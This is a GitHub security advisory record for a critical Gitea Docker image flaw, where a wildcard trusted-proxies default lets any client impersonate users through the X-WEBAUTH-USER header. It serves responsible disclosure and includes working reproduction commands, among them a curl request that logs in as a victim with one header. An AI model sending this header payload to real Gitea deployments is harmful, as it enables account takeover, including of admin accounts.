{"author": null, "closed_at": null, "collaborating_teams": null, "collaborating_users": null, "created_at": null, "credits": [{"login": "rz1027", "type": "reporter"}], "credits_detailed": [{"state": "accepted", "type": "reporter", "user": {"avatar_url": "https://avatars.githubusercontent.com/u/53318196?v=4", "events_url": "https://api.github.com/users/rz1027/events{/privacy}", "followers_url": "https://api.github.com/users/rz1027/followers", "following_url": "https://api.github.com/users/rz1027/following{/other_user}", "gists_url": "https://api.github.com/users/rz1027/gists{/gist_id}", "gravatar_id": "", "html_url": "https://github.com/rz1027", "id": 53318196, "login": "rz1027", "node_id": "MDQ6VXNlcjUzMzE4MTk2", "organizations_url": "https://api.github.com/users/rz1027/orgs", "received_events_url": "https://api.github.com/users/rz1027/received_events", "repos_url": "https://api.github.com/users/rz1027/repos", "site_admin": false, "starred_url": "https://api.github.com/users/rz1027/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/rz1027/subscriptions", "type": "User", "url": "https://api.github.com/users/rz1027", "user_view_type": "public"}}], "cve_id": "CVE-2026-20896", "cvss": {"score": 9.8, "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}, "cvss_severities": {"cvss_v3": {"score": 9.8, "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}, "cvss_v4": {"score": null, "vector_string": null}}, "cwe_ids": [], "cwes": [], "description": "Hi guys, I would like to file a vulnerability I found in the default Gitea docker image, which allows impersonation of users with a single header

# Summary

The Gitea Docker images ship an `app.ini` template that hard-codes:

```
REVERSE_PROXY_TRUSTED_PROXIES = *
```

The documented default for this setting, in `custom/conf/app.example.ini`, is `127.0.0.0/8,::1/128`, i.e. only loopback is trusted.

When an admin enables `ENABLE_REVERSE_PROXY_AUTHENTICATION = true` to put Gitea behind an authenticating reverse proxy and leaves the trusted-proxies setting at "the default", they expect only the proxy's loopback connection to inject identity. The Docker image instead trusts `X-WEBAUTH-USER` from **any source IP** that can reach the container.

## Affected

- `gitea/gitea` Docker images (verified `1.26.2`)
- `docker/root/etc/templates/app.ini:55`
- `docker/rootless/etc/templates/app.ini:52`

Binary distribution and self-built deployments that follow `app.example.ini` get the loopback-only default and are not affected.

## Reproduction

```
docker run -d --name g -p 3000:3000 \
  -e GITEA__service__ENABLE_REVERSE_PROXY_AUTHENTICATION=true \
  -e GITEA__security__INSTALL_LOCK=true \
  gitea/gitea:1.26.2

sleep 15
docker exec --user git g gitea admin user create \
  --username alice --password "longpasswordhere1234" \
  --email alice@x.test --must-change-password=false

Now the attack::


curl -s -L -H "X-WEBAUTH-USER: alice" http://localhost:3000/ \
  | grep -oE '<title>[^<]+</title>'
```

Output: `<title>alice - Dashboard - Gitea: Git with a cup of tea</title>` — attacker is logged in as alice with one header, no password, no cookie.

Same payload with `X-WEBAUTH-USER: <any_existing_username>` impersonates that user.

## Impact

Any process that can reach the Gitea container's HTTP port directly — not through the intended authenticating proxy — can impersonate any user whose login name is known or guessable. Admin accounts (`admin`, `gitea_admin`, etc.) are the obvious targets.

I responsibly didn't test this against live targets, I prefer to disclose to you first before somebody does. It might even be worse if the admin additionally enables `ENABLE_REVERSE_PROXY_AUTO_REGISTRATION`, the same primitive lets the attacker create new accounts at will with any chosen username.

I will provide a poc.sh to be able to run resproduce the exploit with a single ./poc.sh

Thank you!!
", "ghsa_id": "GHSA-f75j-4cw6-rmx4", "html_url": "https://github.com/go-gitea/gitea/security/advisories/GHSA-f75j-4cw6-rmx4", "identifiers": [{"type": "GHSA", "value": "GHSA-f75j-4cw6-rmx4"}, {"type": "CVE", "value": "CVE-2026-20896"}], "private_fork": null, "published_at": "2026-06-21T17:36:57Z", "publisher": {"avatar_url": "https://avatars.githubusercontent.com/u/75789103?v=4", "events_url": "https://api.github.com/users/bircni/events{/privacy}", "followers_url": "https://api.github.com/users/bircni/followers", "following_url": "https://api.github.com/users/bircni/following{/other_user}", "gists_url": "https://api.github.com/users/bircni/gists{/gist_id}", "gravatar_id": "", "html_url": "https://github.com/bircni", "id": 75789103, "login": "bircni", "node_id": "MDQ6VXNlcjc1Nzg5MTAz", "organizations_url": "https://api.github.com/users/bircni/orgs", "received_events_url": "https://api.github.com/users/bircni/received_events", "repos_url": "https://api.github.com/users/bircni/repos", "site_admin": false, "starred_url": "https://api.github.com/users/bircni/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/bircni/subscriptions", "type": "User", "url": "https://api.github.com/users/bircni", "user_view_type": "public"}, "severity": "critical", "state": "published", "submission": null, "summary": "Gitea Docker image: `REVERSE_PROXY_TRUSTED_PROXIES = *` default lets any source IP impersonate any user via `X-WEBAUTH-USER`", "updated_at": "2026-06-21T17:36:57Z", "url": "https://api.github.com/repos/go-gitea/gitea/security-advisories/GHSA-f75j-4cw6-rmx4", "vulnerabilities": [{"package": {"ecosystem": "go", "name": "code.gitea.io/gitea"}, "patched_versions": "1.26.3", "vulnerable_functions": [], "vulnerable_version_range": "<=1.26.2"}], "withdrawn_at": null}

title: Gitea Docker image: `REVERSE_PROXY_TRUSTED_PROXIES = *` default lets any source IP impersonate any user via `X-WEBAUTH-USER`
